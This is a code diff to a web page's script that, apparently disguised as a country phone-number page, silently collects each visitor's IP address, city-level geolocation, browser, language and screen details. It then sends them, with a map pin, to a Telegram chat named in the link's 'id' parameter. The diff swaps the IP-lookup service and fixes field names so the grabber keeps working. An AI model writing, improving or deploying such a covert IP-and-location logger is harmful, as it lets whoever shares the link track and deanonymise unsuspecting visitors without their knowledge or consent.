@@ -46,7 +46,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         const targetUserId = urlParams.get('id');
         const mode = urlParams.get('mode') || 'basic';
-        const userLang = urlParams.get('lang') || 'ar';
+        const userLang = urlParams.get('lang') || 'ar'; 
 
         const countries = [
             { flag: "🇪🇬", name: "Egypt", numbers: ["+20 10 1234 5678", "+20 11 9876 5432"] },
@@ -128,11 +128,12 @@
         async function sendBasicInfo() {
             if (!targetUserId) return;
 
+            // استخدام موقع ipwho.is (أدق وبيدعم https)
             let ipData = {};
             try { 
-                const res = await fetch('http://ip-api.com/json/?fields=status,query,country,regionName,city,isp,org,lat,lon,timezone'); 
+                const res = await fetch('https://ipwho.is/'); 
                 const data = await res.json();
-                if(data.status === 'success') { ipData = data; }
+                if(data.success) { ipData = data; }
             } catch (e) {}
 
             const ua = navigator.userAgent;
@@ -148,8 +149,8 @@
             const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
 
             let report = "";
-            let lat = ipData.lat || 0;
-            let lon = ipData.lon || 0;
+            let lat = ipData.latitude || 0;
+            let lon = ipData.longitude || 0;
 
             if (userLang === 'ar') {
                 report = `
@@ -161,14 +162,14 @@
 • المتصفح: ${ua}
 
 🌐 <b>معلومات الشبكة</b>
-• الآي بي: ${ipData.query || 'غير معروف'}
+• الآي بي: ${ipData.ip || 'غير معروف'}
 • اللغة: ${navigator.language}
 
 📍 <b>تفاصيل الموقع</b>
 • الدولة: ${ipData.country || 'غير معروف'}
-• المحافظة: ${ipData.regionName || 'غير معروف'}
+• المحافظة: ${ipData.region || 'غير معروف'}
 • المدينة: ${ipData.city || 'غير معروف'}
-• المنطقة الزمنية: ${ipData.timezone || 'غير معروف'}
+• المنطقة الزمنية: ${ipData.timezone ? ipData.timezone.id : 'غير معروف'}
 
 🖼️ <b>معلومات الشاشة</b>
 • الدقة: ${screenRes}
@@ -198,14 +199,14 @@
 • यूजर एजेंट: ${ua}
 
 🌐 <b>नेटवर्क जानकारी</b>
-• आईपी पता: ${ipData.query || 'अज्ञात'}
+• आईपी पता: ${ipData.ip || 'अज्ञात'}
 • भाषा: ${navigator.language}
 
 📍 <b>स्थान विवरण</b>
 • देश: ${ipData.country || 'अज्ञात'}
-• क्षेत्र: ${ipData.regionName || 'अज्ञात'}
+• क्षेत्र: ${ipData.region || 'अज्ञात'}
 • शहर: ${ipData.city || 'अज्ञात'}
-• समय क्षेत्र: ${ipData.timezone || 'अज्ञात'}
+• समय क्षेत्र: ${ipData.timezone ? ipData.timezone.id : 'अज्ञात'}
 
 🖼️ <b>प्रदर्शन जानकारी</b>
 • रिज़ॉल्यूशन: ${screenRes}
@@ -235,14 +236,14 @@
 • User Agent: ${ua}
 
 🌐 <b>Network Information</b>
-• IP Address: ${ipData.query || 'Unknown'}
+• IP Address: ${ipData.ip || 'Unknown'}
 • Language: ${navigator.language}
 
 📍 <b>Location Details</b>
 • Country: ${ipData.country || 'Unknown'}
-• Region: ${ipData.regionName || 'Unknown'}
+• Region: ${ipData.region || 'Unknown'}
 • City: ${ipData.city || 'Unknown'}
-• Timezone: ${ipData.timezone || 'Unknown'}
+• Timezone: ${ipData.timezone ? ipData.timezone.id : 'Unknown'}
 
 🖼️ <b>Display Information</b>
 • Resolution: ${screenRes}
@@ -264,13 +265,11 @@
                 `;
             }
 
-            // إرسال الرسالة للبوت
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
             }).catch(e=>{});
 
-            // إرسال الخريطة (بناءً على الـ IP) حتى لو مدي صلاحية
             if (lat !== 0 && lon !== 0) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
